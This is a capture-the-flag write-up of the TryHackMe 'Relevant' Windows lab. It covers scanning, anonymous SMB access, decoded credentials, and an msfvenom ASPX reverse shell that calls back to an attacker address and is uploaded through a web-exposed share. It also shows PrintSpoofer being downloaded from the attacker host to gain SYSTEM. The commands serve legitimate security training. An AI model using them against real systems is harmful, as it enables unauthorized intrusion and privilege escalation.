# Relevant

This is a TryHackMe lab for practicing Windows service enumeration, anonymous SMB access, credential discovery, web-accessible file upload, reverse shells, and privilege escalation with `SeImpersonatePrivilege`.

## Reconnaissance

Started with **RustScan** and **Nmap** to identify open ports and services on the target.

```bash
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The scan identified the following open ports:

```text
80/tcp     Microsoft IIS httpd 10.0
135/tcp    Microsoft Windows RPC
139/tcp    Microsoft Windows netbios-ssn
445/tcp    Microsoft-DS / SMB
3389/tcp   Microsoft Terminal Services / RDP
49663/tcp  Microsoft IIS httpd 10.0
49666/tcp  Microsoft Windows RPC
49668/tcp  Microsoft Windows RPC
```

The host was identified as **Windows Server 2016 Standard Evaluation 14393** with the computer name `Relevant`.

Nmap also reported that SMB message signing was enabled but not required.

---

## SMB Enumeration

Anonymous SMB listing was allowed:

```bash
smbclient -N -L //$target
```

The available shares included:

```text
ADMIN$      Disk      Remote Admin
C$          Disk      Default share
IPC$        IPC       Remote IPC
nt4wrksv    Disk
```

The `nt4wrksv` share allowed anonymous access and contained a file named `passwords.txt`.

```bash
smbclient //$target/nt4wrksv -N
```

```text
smb: \> ls
passwords.txt
smb: \> get passwords.txt
```

The file contained Base64-encoded credentials:

```text
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

After decoding:

```text
Bob  - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

---

## Web Enumeration

The default IIS page was available on port `80`, and another IIS service was available on port `49663`.

Directory enumeration against port `49663` found `aspnet_client`:

```bash
gobuster dir -u "http://$target:49663/" -w /usr/share/wordlists/dirb/common.txt -t 64
```

Result:

```text
aspnet_client        (Status: 301)
```

Further enumeration found:

```bash
gobuster dir -u "http://$target:49663/aspnet_client" -w /usr/share/wordlists/dirb/common.txt -t 64
```

Result:

```text
system_web           (Status: 301)
```

The key discovery was that the SMB share `nt4wrksv` was also reachable through the web server:

```text
http://$target:49663/nt4wrksv/
```

This meant files uploaded over SMB could be executed or served through IIS.

---

## Initial Access

Generated an ASPX reverse shell payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.135.10 LPORT=1337 -f aspx > reverse.aspx
```

Uploaded the payload to the writable SMB share:

```text
smb: \> put reverse.aspx
```

Started a listener:

```bash
nc -lvnp 1337
```

Triggered the payload through the web server:

```bash
curl http://$target:49663/nt4wrksv/reverse.aspx
```

The target connected back and returned a Windows shell:

```text
Microsoft Windows [Version 10.0.14393]
c:\windows\system32\inetsrv>
```

---

## User Flag

After gaining the initial shell, the user flag was found under Bob's desktop:

```text
c:\Users\Bob\Desktop>type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

---

## Privilege Escalation

Privilege enumeration showed that `SeImpersonatePrivilege` was enabled:

```text
Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

This indicated a likely Windows token impersonation privilege escalation path.

Downloaded `PrintSpoofer.exe` to the target:

```powershell
powershell -c "Invoke-WebRequest -Uri 'http://192.168.135.10:8080/PrintSpoofer.exe' -OutFile PrintSpoofer.exe"
```

Executed PrintSpoofer to spawn an elevated PowerShell process:

```powershell
PrintSpoofer.exe -i -c powershell
```

Result:

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
PS C:\Windows\system32>
```

The shell was successfully elevated to a privileged context.

---

## Root Flag

The root flag was found on the Administrator desktop:

```text
PS C:\Users\Administrator\Desktop> type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```

---

## Attack Path

```text
RustScan / Nmap
        ↓
Windows Server + IIS + SMB Discovery
        ↓
Anonymous SMB Share Enumeration
        ↓
Base64 Credential Disclosure
        ↓
Writable SMB Share Discovery
        ↓
Web-Accessible SMB Path on IIS
        ↓
ASPX Reverse Shell Upload
        ↓
Initial Shell as IIS Context
        ↓
SeImpersonatePrivilege Discovery
        ↓
PrintSpoofer Token Impersonation
        ↓
Administrator / SYSTEM-Level Access
```

## Key Takeaways

* Anonymous SMB access can expose sensitive files even when the main web service looks minimal.
* Encoded credentials should not be treated as protected secrets.
* A writable SMB share mapped into an IIS web path can become remote code execution.
* `SeImpersonatePrivilege` is a high-value privilege on Windows services and can lead to full compromise when exploitable.
* Enumeration across services is important because the attack path depended on combining SMB and IIS behavior.
